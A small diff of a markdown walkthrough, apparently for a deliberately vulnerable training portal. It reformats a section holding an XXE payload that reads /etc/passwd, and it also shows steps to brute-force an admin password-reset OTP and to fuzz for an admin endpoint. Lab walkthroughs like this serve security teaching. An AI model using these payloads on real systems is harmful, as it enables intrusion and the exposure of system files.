@@ -61,12 +61,12 @@ go to reset password page & use username admin & bruteforce the OTP it will give
 
 ## Security misconfiguration
 create  a .xml file & add below data then upload it the portal you can see /etc/passwd file contents</br>
-***
+```
 <!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]>
 <root>
 &test;
 </root>
-***
+```
 
 ## Vulnerable & outdated components
 Fuzz the files & you will find admin endpoint with login page</br>
